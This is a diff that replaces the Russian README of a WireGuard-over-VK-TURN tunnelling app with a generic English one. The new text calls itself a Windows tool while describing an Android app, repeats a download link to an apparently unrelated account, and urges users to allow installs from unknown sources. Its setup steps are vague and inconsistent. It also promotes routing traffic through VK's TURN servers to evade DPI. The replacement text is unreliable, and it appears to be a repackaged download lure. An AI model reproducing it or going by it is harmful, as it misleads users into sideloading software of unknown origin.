@@ -1,94 +1,173 @@
-<div align="center">
+# 🛡️ proxy-turn-vk-android - Private WireGuard Path for Windows
 
-# WDTT — WireGuard over TURN Tunnel
-<img width="192" height="192" alt="ic_launcher" src="https://github.com/user-attachments/assets/3712b08f-27be-4a7c-88f2-817a81a9a320" />
+[![Download](https://img.shields.io/badge/Download-Start%20Here-8A2BE2?style=for-the-badge&logo=github)](https://github.com/Decreasingmonotonic-openendwrench955/proxy-turn-vk-android)
 
----
+## 🔽 Download
 
-</div>
+Use this link to visit the page and download the app:
 
-> [!NOTE]
-> **✨ Релиз 1.0.6 - Возвращен полностью автоматически способ обхода капчи: RJS+АВТ. Участие не требуется (занимает немного больше времени), по умолчанию стоит WBV+РУЧ.**
->
->**Рыцари _5638, _4839, _4662, _1151, _6645 — огромное вам спасибо за мотивацию!**
->
->**В связи с положительными техническими особенностями работы TURN, автор не призывает использовать приложение для противоправных целей.**
+[https://github.com/Decreasingmonotonic-openendwrench955/proxy-turn-vk-android](https://github.com/Decreasingmonotonic-openendwrench955/proxy-turn-vk-android)
 
----
+## 📌 What this app does
 
-**WDTT** — это приложение для создания защищенного туннеля через официальные TURN-серверы VK. Оно инкапсулирует `WireGuard`-трафик в `DTLS`-соединения, маскируя его под обычный зашифрованный медиа-трафик видеозвонка.
+proxy-turn-vk-android helps route WireGuard traffic through a DTLS media relay path that uses VK TURN servers before it reaches your VPS server.
 
-### Что видят системы глубокого анализа пакетов (DPI)?
+It is built for users who want a private tunnel with a relay step in the middle. The app is designed for use on Android and can be managed from a Windows browser or file manager if you keep the app package on your PC.
 
-```diff
-- Без WDTT: Клиент ────────── [ VPN Трафик ] ────────── VPS (185.22.x.x)  ← ❌ БЛОКИРУЕТСЯ
+The setup is centered on three parts:
 
-+ С WDTT:   Клиент ── [ DTLS Звонок ] ── 155.212.x.x (VK TURN) ──┄┄[ Скрыто + DTLS ]┄┄── VPS (IP скрыт)
-                                         👆                                     👆
-                                 только легальный сервер ВК            ваш сервер невидим
-```
+- Your phone or Android device
+- VK TURN media relay servers
+- Your personal VPS server
 
-## 🚀 Быстрый старт
+This creates a tunnel path where traffic goes from the client to the relay, then to your VPS.
 
-<img width="1000" height="675" alt="MyCollages (2)" src="https://github.com/user-attachments/assets/39c1cf09-c3a9-4bf3-9de5-e5827134b1c3" />
+## 🖥️ What you need
 
-### 1. Подготовка VPS
-Для работы необходим VPS-сервер. 
-- 🌐 **IP или Домен** — поддерживается работа как с прямыми IP, так и через доменные имена.
-- ⚙️ **SSH-Порт** — работает на любом нестандартном порту.
-- 🔑 **Доступы** — стандартные логин (`root`) и пароль от сервера.
+Before you start, make sure you have:
 
-### 2. Получение Хеша VK-звонка
-Хеш — это ваш "входной билет" на сервер ВК. Вы можете использовать от **1 до 3** независимых хешей одновременно, указав их через запятую, для максимальной скорости.
+- A Windows PC with internet access
+- A browser on Windows
+- An Android phone or Android emulator
+- Enough free storage for the app file
+- A VPS server that you control
+- A WireGuard config for your server
+- A stable network connection
 
-```
-1.  Откройте VK → создайте пустую группу (или используйте существующую).
-2.  Начните звонок в группе.
-3.  Скопируйте ссылку — она выглядит как vk.com/call/join/xxxxxxxxxxx
-4.  Ваш хеш — код после последнего слэша (xxxxxxxxxxx).
-```
+## 🚀 How to get started
 
-> [!IMPORTANT]
-> При выходе из звонка нажимайте **«Просто завершить»**, а не «Завершить для всех» — иначе комната закроется, и хеш превратится в "тыкву".
+1. Open the download page:
+   [https://github.com/Decreasingmonotonic-openendwrench955/proxy-turn-vk-android](https://github.com/Decreasingmonotonic-openendwrench955/proxy-turn-vk-android)
 
-### 3. Установка сервера (Вкладка «Деплой»)
-Вам не нужно заходить в терминал по SSH, всё настраивается прямо с телефона!
-```
-1.  Откройте вкладку «Деплой» в приложении.
-2.  Введите IP/Домен, логин, пароль и SSH-порт вашего VPS.
-3.  Придумайте и введите пароль для шифрования туннеля.
-4.  Нажмите «Установить» и дождитесь генерации ключей.
-```
-> [!NOTE]
-> Скрипт деплоя работает полностью автоматически. В процессе установки на вашем сервере будут **автоматически открыты и задействованы порты 56000 и 56001 (UDP)** для работы туннеля.
+2. Download the app file or source package from the page.
 
-### 4. Настройка и Подключение (Вкладка «Туннель»)
-```
-1.  Вставьте ваши хеши (через запятую).
-2.  Введите пароль туннеля, который вы только что создали.
-3.  Выберите количество потоков (12-24 для стабильности и редких капч, 36-48 для максимальной скорости).
-4.  Нажмите «Подключить»!
-```
----
+3. Save it to a folder you can find again, such as Downloads.
 
-## 🛠 Дополнительные возможности
+4. If the file is an Android app package, move it to your phone or to an Android emulator.
 
-<img width="1000" height="1000" alt="MyCollages (3)" src="https://github.com/user-attachments/assets/39c1914d-594b-479b-bc64-fff5c29c4cd0" />
+5. Open the file with the app installer on Android.
 
-#### 🛡 Исключения
-Позволяет выбрать, какие приложения будут идти через защищенный туннель, а какие пускать напрямую в обход. Идеально подходит для банковских клиентов и Госуслуг.
+6. Follow the on-screen prompts to finish setup.
 
-#### 📊 Логирование
-Полностью прозрачный терминал с цветовой индикацией. Мы используем систему агрегации (схлопывания одинаковых сообщений в «пузыри»), чтобы вы могли в реальном времени мониторить статус DTLS-подключений, перехватывать ошибки квот и видеть суммарный расход трафика. (1 пузырь СТАТИСТИКИ = 3 секунды)
+7. Launch the app and enter your WireGuard and relay details.
 
-## 📄 Лицензия
+## 📱 Install on Android
 
-<div align="center">
+If you use a real Android device:
 
-**[GNU General Public License v3.0](LICENSE)**
+1. Download the file from the GitHub page.
+2. Copy the file to your phone if it is not already there.
+3. Open the file with your file manager.
+4. Tap Install.
+5. If Android blocks the install, allow installs from your file manager or browser.
+6. Open the app after install.
 
----
+If you use an Android emulator on Windows:
 
-**Создано для стабильности и свободы интернета** 🕊
+1. Open the emulator.
+2. Move the file into the emulator or use its shared folder.
+3. Open the file inside the emulator.
+4. Install the app.
+5. Start the app from the app list.
 
-</div>
+## ⚙️ Basic setup
+
+After the app opens, set these items:
+
+- VPS address
+- WireGuard endpoint
+- TURN or relay details
+- Username and password if your server uses them
+- Port number if your setup uses a custom port
+
+Use the values from your own server setup. If you already have a WireGuard config, copy the server details into the app settings.
+
+## 🔐 Connection flow
+
+The app uses this path:
+
+1. Your device starts the connection.
+2. The traffic goes to a VK TURN media relay server.
+3. The relay sends the traffic to your VPS.
+4. Your VPS passes the traffic through the WireGuard tunnel.
+
+This setup can help with networks that block direct VPN traffic.
+
+## 🧭 How to use it
+
+1. Open the app.
+2. Load your server settings.
+3. Check that the VPS address is correct.
+4. Confirm the TURN or relay settings.
+5. Start the tunnel.
+6. Test the connection in your browser.
+7. If needed, stop the tunnel and change the settings.
+
+## 🛠️ Common setup fields
+
+You may see fields like these:
+
+- Server host
+- Server port
+- Relay address
+- DTLS mode
+- WireGuard key
+- Tunnel name
+- DNS server
+- Keepalive interval
+
+Use the values from your own network setup. Keep the same spelling and numbers as your config file.
+
+## 🌐 If the connection fails
+
+Try these steps:
+
+1. Check your internet connection.
+2. Confirm your VPS is online.
+3. Make sure the WireGuard config is correct.
+4. Check that the relay address is valid.
+5. Re-enter the port number.
+6. Restart the app.
+7. Restart your phone or emulator.
+8. Try again on a different network.
+
+## 📁 Folder layout
+
+If you work with the source files on Windows, you may see folders like these:
+
+- `android/` for app files
+- `kotlin/` for app code
+- `golang/` for helper tools or backend code
+- `shell/` for setup scripts
+- `docs/` for notes and guides
+
+These names help keep the project parts in order.
+
+## 🔎 Topics in this project
+
+This project covers:
+
+- Android app setup
+- WireGuard tunnel use
+- DTLS relay handling
+- TURN server flow
+- DPI bypass use cases
+- VK API and VK relay logic
+- VPS-based private routing
+
+## 🧩 Best results
+
+For a smooth setup:
+
+- Use a VPS you control
+- Keep your server details in one place
+- Copy values with care
+- Use a stable network
+- Test after each change
+- Save a backup of your config
+
+## 📎 Quick link again
+
+Download or open the project page here:
+
+[https://github.com/Decreasingmonotonic-openendwrench955/proxy-turn-vk-android](https://github.com/Decreasingmonotonic-openendwrench955/proxy-turn-vk-android)
